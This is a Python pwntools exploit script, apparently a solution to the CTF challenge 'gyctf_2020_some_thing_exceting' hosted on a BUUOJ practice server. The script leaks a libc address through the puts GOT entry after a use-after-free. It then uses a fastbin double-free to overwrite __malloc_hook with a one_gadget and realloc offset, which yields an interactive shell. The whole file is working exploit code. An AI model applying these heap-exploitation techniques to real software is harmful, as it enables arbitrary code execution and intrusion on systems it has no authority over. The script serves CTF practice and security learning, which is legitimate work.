from os import system
from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_some_thing_exceting')
io = remote('node4.buuoj.cn', 28203)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gyctf_2020_some_thing_exceting')
puts_got = elf.got['puts']


def add(size1, content1, size2, content2):
    io.sendlineafter('> Now please tell me what you want to do :', '1')
    io.sendlineafter('> ba\'s length : ', str(size1))
    io.sendafter('> ba : ', content1)
    io.sendlineafter('> na\'s length : ', str(size2))
    io.sendafter('> na : ', content2)


def delete(id):
    io.sendlineafter('> Now please tell me what you want to do :', '3')
    io.sendlineafter('> Banana ID : ', str(id))


def show(id):
    io.sendlineafter('> Now please tell me what you want to do :', '4')
    io.sendlineafter('> SCP project ID : ', str(id))


def leak_libc():
    global libc_base
    add(0x60, '1\n', 0x70, '2\n')
    add(0x70, '3\n', 0x70, '4\n')
    delete(0)
    delete(1)
    add(0x10, p64(puts_got) * 2, 0x70, b'4\n')
    show(0)
    io.recvuntil('# Banana\'s na is ')
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    add(0x70, '3\n', 0x60, '5\n')
    add(0x70, '2\n', 0x60, '6\n')
    delete(3)
    delete(4)
    delete(3)
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc = libc_base + libc.sym['realloc']
    # one_gadget = libc_base + 0xf1247
    one_gadget = libc_base + 0xf1147
    fake_chunk = __malloc_hook - 0x23
    add(0x68, p64(fake_chunk), 0x68, b'a')
    add(0x68, b'a', 0x68, b'a' * 0xb + p64(one_gadget) + p64(realloc + 2))
    # gdb.attach(io)
    # pause() 
    io.sendlineafter('> Now please tell me what you want to do :', '1')
    io.interactive()
    

if __name__ == '__main__':
    leak_libc()
    pwn()
